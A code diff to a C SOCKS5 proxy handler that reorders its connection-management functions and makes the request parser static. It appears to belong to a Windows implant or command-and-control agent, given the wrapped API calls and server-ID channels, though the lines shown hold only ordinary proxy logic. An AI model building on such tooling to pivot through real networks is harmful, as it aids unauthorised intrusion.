@@ -138,53 +138,52 @@ static BOOL socks_connect(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, U
     return ret_val;
 }
 
-// Initialize the SOCKS context
-PGS_SOCKS_CONTEXT socks_init() {
-    PGS_SOCKS_CONTEXT context = (PGS_SOCKS_CONTEXT)mcalloc(sizeof(GS_SOCKS_CONTEXT));
-
-    // Initialize the CTX
-    context->connections = NULL;
-    context->connection_count = 0;
-
-    return context;
-}
-
-// Find a SOCKS connection by server ID
-PGLUON_SOCKS_CONN socks_find_connection(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
-    PGLUON_SOCKS_CONN current = ctx->connections;
-    while (current) {
-        if (current->server_id == server_id) {
-            return current;
-        }
-        current = current->next;
+static BOOL socks_open_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, UINT32 data_len, PBYTE *data_out, UINT32 *data_out_len){
+    // SOCKS5 header: VER(1) CMD(1) RSV(1) ATYP(1)
+    if (data_len < 4) {
+        _err("SOCKS5 request too short");
+        return FALSE;
     }
-    return NULL; // Not found
-}
 
-// Remove a SOCKS connection by server ID
-BOOL socks_remove(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
-    PGLUON_SOCKS_CONN current = ctx->connections;
-    PGLUON_SOCKS_CONN prev    = NULL;
-    while (current) {
-        if (current->server_id == server_id) {
-            if (prev) {
-                prev->next = current->next;
-            } else { // Removing head
-                ctx->connections = current->next;
-            }
+    BYTE version = data[0];
+    BYTE cmd     = data[1];
 
-            _inf("Removing connection with Server ID: %u", server_id);
-            API(closesocket)(current->socket);
-            mcfree(current);
 
-            ctx->connection_count--; // Decrement connection count
-
-            return TRUE;
-        }
-        prev    = current;
-        current = current->next;
+    if (version != 0x05) {
+        _err("Invalid SOCKS version: 0x%02x", version);
+        return FALSE;
     }
-    return FALSE; // Not found
+
+    switch (cmd)
+    {
+    case 0x01: // CONNECT
+        return socks_connect(ctx, server_id, data, data_len, data_out, data_out_len); 
+        break;
+    case 0x02: // BIND
+        _err("BIND command not supported");
+        goto error_handle;
+        break;
+    case 0x03: // UDP ASSOCIATE
+        _err("UDP ASSOCIATE command not supported");
+        goto error_handle;
+        break;
+    default:
+        _err("Unknown command: 0x%02x", cmd);
+        goto error_handle;
+        break;
+    }
+
+    error_handle:
+    ;
+
+    PBYTE ret = (PBYTE)mcalloc(10); // Allocate response buffer
+
+    API(RtlMoveMemory)(ret, "\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00", 10);
+
+    *data_out     = ret;
+    *data_out_len = 10;
+
+    return TRUE;
 }
 
 // Create a new SOCKS connection
@@ -286,52 +285,53 @@ BOOL socks_create_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PCHAR target_ip,
     return TRUE;
 }
 
-BOOL socks_open_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, UINT32 data_len, PBYTE *data_out, UINT32 *data_out_len){
-    // SOCKS5 header: VER(1) CMD(1) RSV(1) ATYP(1)
-    if (data_len < 4) {
-        _err("SOCKS5 request too short");
-        return FALSE;
+// Initialize the SOCKS context
+PGS_SOCKS_CONTEXT socks_init() {
+    PGS_SOCKS_CONTEXT context = (PGS_SOCKS_CONTEXT)mcalloc(sizeof(GS_SOCKS_CONTEXT));
+
+    // Initialize the CTX
+    context->connections = NULL;
+    context->connection_count = 0;
+
+    return context;
+}
+
+// Find a SOCKS connection by server ID
+PGLUON_SOCKS_CONN socks_find_connection(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
+    PGLUON_SOCKS_CONN current = ctx->connections;
+    while (current) {
+        if (current->server_id == server_id) {
+            return current;
+        }
+        current = current->next;
     }
+    return NULL; // Not found
+}
 
-    BYTE version = data[0];
-    BYTE cmd     = data[1];
+// Remove a SOCKS connection by server ID
+BOOL socks_remove(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
+    PGLUON_SOCKS_CONN current = ctx->connections;
+    PGLUON_SOCKS_CONN prev    = NULL;
+    while (current) {
+        if (current->server_id == server_id) {
+            if (prev) {
+                prev->next = current->next;
+            } else { // Removing head
+                ctx->connections = current->next;
+            }
 
+            _inf("Removing connection with Server ID: %u", server_id);
+            API(closesocket)(current->socket);
+            mcfree(current);
 
-    if (version != 0x05) {
-        _err("Invalid SOCKS version: 0x%02x", version);
-        return FALSE;
+            ctx->connection_count--; // Decrement connection count
+
+            return TRUE;
+        }
+        prev    = current;
+        current = current->next;
     }
-
-    switch (cmd)
-    {
-    case 0x01: // CONNECT
-        return socks_connect(ctx, server_id, data, data_len, data_out, data_out_len); 
-        break;
-    case 0x02: // BIND
-        _err("BIND command not supported");
-        goto error_handle;
-        break;
-    case 0x03: // UDP ASSOCIATE
-        _err("UDP ASSOCIATE command not supported");
-        goto error_handle;
-        break;
-    default:
-        _err("Unknown command: 0x%02x", cmd);
-        goto error_handle;
-        break;
-    }
-
-    error_handle:
-    ;
-
-    PBYTE ret = (PBYTE)mcalloc(10); // Allocate response buffer
-
-    API(RtlMoveMemory)(ret, "\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00", 10);
-
-    *data_out     = ret;
-    *data_out_len = 10;
-
-    return TRUE;
+    return FALSE; // Not found
 }
 
 BOOL socks_parse_data(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, UINT32 data_len, PBYTE *data_out, UINT32 *data_out_len) {
@@ -444,16 +444,3 @@ BOOL socks_recv_data(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE *data_out, U
     mcfree(buffer);
     return TRUE;
 }
-
-// PGLUON_SOCKS_CONN connection_list_create(){
-//     PGLUON_SOCKS_CONN head = (PGLUON_SOCKS_CONN)mcalloc(sizeof(GLUON_SOCKS_CONN));
-//     if (!head) {
-//         _err("Failed to allocate memory for connection list");
-//         return NULL;
-//     }
-//     head->server_id = 0;
-//     head->socket = INVALID_SOCKET;
-//     head->connected = FALSE;
-//     head->next = NULL;
-//     return head;
-// }
